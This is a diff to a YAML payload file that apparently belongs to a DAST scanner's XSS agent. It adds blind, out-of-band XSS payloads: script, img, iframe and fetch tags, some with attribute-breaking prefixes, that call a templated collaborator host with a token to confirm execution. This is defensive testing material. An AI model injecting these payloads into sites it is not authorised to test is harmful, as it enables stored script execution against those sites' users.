@@ -55,6 +55,20 @@ payloads:
     - '<script>alert("DAST_XSS_CONFIRM")</script>'
     - '<svg onload=alert("DAST_XSS_CONFIRM")>'
 
+  blind_oob:
+    # Blind/stored XSS with OUT-OF-BAND confirmation (5-B-1): {{COLLAB_*}}/{{TOKEN}}
+    # are substituted at runtime by xss_agent (same template convention as ssrf.yaml).
+    # A callback on the token is proof the payload EXECUTED in a real browser
+    # somewhere (admin preview, email renderer, queued viewer) — no in-band
+    # reflection needed. Only injected when a local collaborator is available.
+    - '<script src="http://{{COLLAB_HOST}}:{{COLLAB_PORT}}/{{TOKEN}}"></script>'
+    - '<img src="http://{{COLLAB_HOST}}:{{COLLAB_PORT}}/{{TOKEN}}">'
+    - "<svg onload=\"fetch('http://{{COLLAB_HOST}}:{{COLLAB_PORT}}/{{TOKEN}}')\"></svg>"
+    - '<iframe src="http://{{COLLAB_HOST}}:{{COLLAB_PORT}}/{{TOKEN}}"></iframe>'
+    # attribute-breaking variants for stored contexts that escape into an attribute
+    - '"><script src="http://{{COLLAB_HOST}}:{{COLLAB_PORT}}/{{TOKEN}}"></script>'
+    - "'><img src=\"http://{{COLLAB_HOST}}:{{COLLAB_PORT}}/{{TOKEN}}\">"
+
 # Confirmation marker injected into blind payloads — browser validator looks for this
 confirm_marker: "DAST_XSS_CONFIRM"
 
